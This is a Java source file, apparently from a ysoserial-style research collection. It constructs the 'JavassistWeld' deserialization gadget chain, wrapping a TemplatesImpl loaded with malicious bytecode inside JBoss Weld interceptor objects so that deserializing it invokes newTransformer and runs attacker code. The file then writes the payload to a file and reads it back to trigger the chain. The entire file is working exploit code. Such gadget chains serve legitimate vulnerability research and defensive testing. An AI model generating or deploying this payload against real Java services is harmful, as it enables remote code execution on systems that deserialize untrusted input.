package org.su18.serialize.ysoserial.JavassistWeld;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.jboss.weld.interceptor.builder.InterceptionModelBuilder;
import org.jboss.weld.interceptor.builder.MethodReference;
import org.jboss.weld.interceptor.proxy.DefaultInvocationContextFactory;
import org.jboss.weld.interceptor.proxy.InterceptorMethodHandler;
import org.jboss.weld.interceptor.reader.ClassMetadataInterceptorReference;
import org.jboss.weld.interceptor.reader.DefaultMethodMetadata;
import org.jboss.weld.interceptor.reader.ReflectiveClassMetadata;
import org.jboss.weld.interceptor.reader.SimpleInterceptorMetadata;
import org.jboss.weld.interceptor.spi.instance.InterceptorInstantiator;
import org.jboss.weld.interceptor.spi.metadata.InterceptorReference;
import org.jboss.weld.interceptor.spi.metadata.MethodMetadata;
import org.jboss.weld.interceptor.spi.model.InterceptionModel;
import org.jboss.weld.interceptor.spi.model.InterceptionType;
import org.su18.serialize.utils.SerializeUtil;

import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.*;

/**
 * https://www.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class-deepsec-edition
 *
 * @author su18
 */
public class JavassistWeld {


	public static void main(String[] args) throws Exception {

		// 生成包含恶意类字节码的 TemplatesImpl 类
		final TemplatesImpl tmpl = SerializeUtil.generateTemplatesImpl();

		// 要反射调用的恶意方法
		Method method = TemplatesImpl.class.getDeclaredMethod("newTransformer");

		ReflectiveClassMetadata metadata             = (ReflectiveClassMetadata) ReflectiveClassMetadata.of(HashMap.class);
		InterceptorReference    interceptorReference = ClassMetadataInterceptorReference.of(metadata);

		Set<InterceptionType> s = new HashSet<InterceptionType>();
		s.add(org.jboss.weld.interceptor.spi.model.InterceptionType.POST_ACTIVATE);

		// 使用 DefaultMethodMetadata 构造方法创建 MethodMetadata 实例
		Constructor defaultMethodMetadataConstructor = DefaultMethodMetadata.class.getDeclaredConstructor(
				Set.class, MethodReference.class);
		defaultMethodMetadataConstructor.setAccessible(true);
		MethodMetadata methodMetadata = (MethodMetadata) defaultMethodMetadataConstructor.newInstance(s,
				MethodReference.of(method, true));

		List list = new ArrayList();
		list.add(methodMetadata);

		Map<InterceptionType, List<MethodMetadata>> hashMap = new HashMap<org.jboss.weld.interceptor.spi.model.InterceptionType, List<MethodMetadata>>();
		hashMap.put(org.jboss.weld.interceptor.spi.model.InterceptionType.POST_ACTIVATE, list);

		SimpleInterceptorMetadata simpleInterceptorMetadata = new SimpleInterceptorMetadata(
				interceptorReference, true, hashMap);

		// 使用 InterceptionModelBuilder 创建 InterceptionModelImpl 实例
		InterceptionModelBuilder builder = InterceptionModelBuilder.newBuilderFor(HashMap.class);
		builder.interceptAll().with(simpleInterceptorMetadata);
		InterceptionModel model = builder.build();

		HashMap map = new HashMap();
		map.put("su18", "su18");

		DefaultInvocationContextFactory factory = new DefaultInvocationContextFactory();

		// 返回恶意实例的 InterceptorInstantiator
		InterceptorInstantiator interceptorInstantiator = new InterceptorInstantiator() {

			public Object createFor(InterceptorReference paramInterceptorReference) {
				return tmpl;
			}
		};

		InterceptorMethodHandler interceptorMethodHandler = new InterceptorMethodHandler(
				map, metadata, model, interceptorInstantiator, factory);


		SerializeUtil.writeObjectToFile(interceptorMethodHandler);
		SerializeUtil.readFileObject();

	}
}